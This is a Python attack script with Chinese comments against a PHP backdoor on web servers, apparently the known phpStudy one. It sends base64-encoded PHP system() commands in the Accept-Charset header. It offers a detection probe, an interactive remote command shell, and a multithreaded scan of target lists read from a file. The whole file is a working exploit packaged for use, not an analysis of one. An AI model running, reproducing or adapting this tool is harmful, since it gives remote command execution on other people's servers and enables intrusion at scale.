import threading
import requests
import base64
import re
import optparse


def exp(url,cmd):                       
    cmd ="echo '<iclby>';system('"+cmd+"');echo '</iclby>';"    #设置payload,加一个自定义标签是为了后面正则容易匹配命令执行后的结果
    cmd = base64.b64encode(cmd.encode('utf-8'))                 #对payload进行加密
    header={                                                    #设置http头
        "accept-charset": cmd,
        "Accept-Encoding": "gzip,deflate"
    }
    url = url                                                   #设置目标
    try:
        response = requests.get(url,headers=header, timeout=10,verify=False)      
    except:
        print("[-]网站访问超时!!!")
        exit(0)
    if(response.status_code!=200):
        print("[-]网站响应状态码不是200")
        exit(0)
    r = re.compile("<iclby>(.*?)</iclby>",re.S)                 #创建正则,为了匹配执行后的命令
    result = re.search(r, response.text)
    if(result!=None):                                           #判断返回后的命令函数是否为空
        print(result.group(1).strip())
    else:
        poc(url)                                                #如果没有成功就调用漏洞验证的函数
        exit(0)
"""
此函数是用来漏洞验证
只有一个参数,用来接收目标网址
"""
def poc(url):
    url = url.strip()                                           #因为要读取文件,为了保险起见去除空格,以保证准确性
    header={                                                    #设置http头
        "accept-charset": "ZWNobyAnaWxjYnloYWhhJzs=",
        "Accept-Encoding": "gzip,deflate"
    }
    try:
        response = requests.get(url, headers=header, timeout=5)
    except:
        print("[-]网站超时")
        exit(0)
    if(response.status_code!=200):
        print("[-]网站响应状态吗不是200")
        exit(0)
    text = response.text
    r = re.compile("ilc.*?yhaha",re.S)
    if(re.search(r,text)):
        print("[+]%s:存在php后门漏洞!"%url)
    else:
        print("[-]不存在php后门漏洞!")

def main():
    parser = optparse.OptionParser("[*]Usage: 验证是否有漏洞-s加目标,漏洞利用-e加目标(exit退出交互),-f漏洞扫描,扫描文件")
    parser.add_option("-s",dest="scan",type="string",help="扫描是否存在漏洞")
    parser.add_option("-e",dest="shell",type="string",help="漏洞利用,交互式shell")
    parser.add_option("-f",dest="file",type="string",help="扫描文件里面的ip是否存在漏洞")
    (options, args) = parser.parse_args()
    scan = options.scan
    shell = options.shell
    d = options.file
    if(scan!=None):
        poc(scan)
    elif(shell!=None):
        result = input("请输入要执行的命令:\n>>>")
        while(result != "exit"):
            exp(shell,result)
            result = input(">>>")
    elif(d!=None):
        try:
            with open(d,'r') as f:
                for i in f:
                    threading.Thread(target=poc,args=(i,)).start()
        except FileNotFoundError:
            print("文件不存在,或者权限不够")

    else:
        print(parser.usage)
        
main()